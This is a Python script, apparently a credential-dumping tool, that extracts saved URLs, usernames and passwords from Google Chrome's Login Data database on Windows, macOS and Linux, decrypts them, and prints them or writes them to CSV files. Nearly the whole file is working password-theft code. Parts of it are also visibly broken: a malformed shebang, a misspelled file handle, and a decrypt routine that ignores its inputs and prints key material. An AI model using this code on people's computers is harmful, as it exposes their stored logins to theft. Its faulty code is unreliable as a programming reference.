#*/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import re
import sys
import sqlite3
import csv
import json
import argparse
import binascii
import hashlib
import base64
import subprocess

try:
    import win32crypt
except:
    pass

def get_SafeStorageKey():
    ssk_file = "/".join(__file__.split("/")[:-1]) + "/get_ssk.sh"
    ssk_cmd = subprocess.Popen(["sh", ssk_file], stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()

    ssk = ssk_cmd[0].decode("ascii").replace("\n", "").replace("\"", "")

    return ssk.encode("ascii")

def decrypt(encrypted_password, iv, key=None):
    hex_key = binascii.hexlify(key)
    hex_password = base64.b64encode(encrypted_password[3:])

    print(iv, hex_key, hex_password)

    dc_file = "/".join(__file__.split("/")[:-1]) + "/decrypt_pwd.sh"

    try:
        decrypted_pass = subprocess.Popen(["sh", dc_file], stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
    except Exception as e:
        decrypted_pass = e

    return decrypted_pass

def main():
    info_list = []
    path = get_path()
    if type(path) == type([]):
        profiles = {}
        for p in sorted(path):
            if not os.path.isdir(p):
                continue
            db_path = p + "/Login Data"
            try:
                connection = sqlite3.connect(db_path)

                c = connection.cursor()
                v = c.execute("SELECT action_url, username_value, password_value FROM logins")
                value = v.fetchall()

                for origin_url, username, password in value:
                    if os.name == "nt":
                        password = win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]

                    if password:
                        info_list.append({
                            "origin_url": origin_url,
                            "username": username,
                            "password": password
                        })
            except sqlite3.OperationalError as e:
                e = str(e)
                if (e == "database is locked"):
                    print("[*] Make sure Google Chrome is not running in the background")
                elif (e == "no such table: logins"):
                    print("[*] Something is wrong with the database name")
                elif (e == "unable to open database file"):
                    print("[*] Something is wrong with the database path")
                else:
                    print(e)

                sys.exit(0)

            profiles[re.search(r"Profile \d", p).group()] = info_list

        return profiles
    else:
        try:
            connection = sqlite3.connect(path + "Login Data")

            c = connection.cursor()
            v = c.execute("SELECT action_url, username_value, password_value FROM logins")
            value = v.fetchall()

            for origin_url, username, password in value:
                if os.name == "nt":
                    password = win32crypt.CryptUnprotectData(
                        password, None, None, None, 0)[1]
                
                if password:
                    info_list.append({
                        "origin_url": origin_url,
                        "username": username,
                        "password": password
                    })

        except sqlite3.OperationalError as e:
            e = str(e)
            if (e == "database is locked"):
                print("[*] Make sure Google Chrome is not running in the background")
            elif (e == "no such table: logins"):
                print("[*] Something wrong with the database name")
            elif (e == "unable to open database file"):
                print("[*] Something wrong with the database path")
            else:
                print(e)
            sys.exit(0)

        return info_list


def get_path():
    if os.name == "nt":
        PathName = os.getenv("localappdata") + \
            "\\Google\\Chrome\\User Data\\Default\\"
    elif os.name == "posix":
        PathName = os.getenv("HOME")
        if sys.platform == "darwin":
            if not os.path.isdir(PathName + "/Library/Application Support/Google/Chrome/Default/"):
                #profiles = []
                #for f in os.listdir(PathName + "/Library/Application Support/Google/Chrome/"):
                #    if "Profile " in f:
                #        profiles.append(PathName + "/Library/Application Support/Google/Chrome/" + f)

                if os.path.isdir(PathName + "/Library/Application Support/Google/Chrome/Profile 1"):
                    PathName = PathName + "/Library/Application Support/Google/Chrome/Profile 1/"
            else:
                PathName += "/Library/Application Support/Google/Chrome/Default/"
        else:
            PathName += "/.config/google-chrome/Default/"

    if type(PathName) != type([]):
        if not os.path.isdir(PathName):
            sys.exit("[*] Google Chrome profiles do not exist")

    return PathName

def output_csv(info, export_loc=os.getcwd(), _print=True):
    ssk = get_SafeStorageKey()

    iv = ''.join(('20',) * 16)
    key = hashlib.pbkdf2_hmac('sha1', ssk, b'saltysalt', 1003)[:16]

    if type(info) == type({}):
        for p in info:
            v = info[p]
            try:
                with open("chrome_{}.csv".format(p.replace(" ", "").lower()), "wb") as csv_file:
                    csv_file.write("Origin URL,Username,Password,IV,Key \n".encode("utf-8"))
                    for data in v:
                        sv_file.write(("{}, {}, {}, {}, {} \n".format(data["origin_url"], data["username"], data["password"], iv, key).encode("utf-8")))

                if _print:
                    print("Data written to chrome_{}.csv".format(p.replace(" ", "").lower()))
            except EnvironmentError:
                print("EnvironmentError: Unable to write the data!")
    else:
        try:
            with open("chrome.csv", "wb") as csv_file:
                csv_file.write("URL,Username,Password,IV,Key \n".encode("utf-8"))
                for data in info:
                    csv_file.write(("{}, {}, {}, {}, {} \n".format(data["origin_url"], data["username"], data["password"], iv, key).encode("utf-8")))
            if _print:
                print("Data written to chrome.csv")
        except EnvironmentError:
            print("EnvironmentError: cannot write data")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Retrieve Google Chrome Passwords")
    parser.add_argument("-o", "--output",
                        help="Output passwords to CSV format")
    parser.add_argument(
        "-d", "--dump", help="Dump passwords to stdout", action="store_true")

    args = parser.parse_args()
    if args.dump:
        for data in main():
            print(data)
    if args.output:
        output_csv(main())
    else:
        parser.print_help()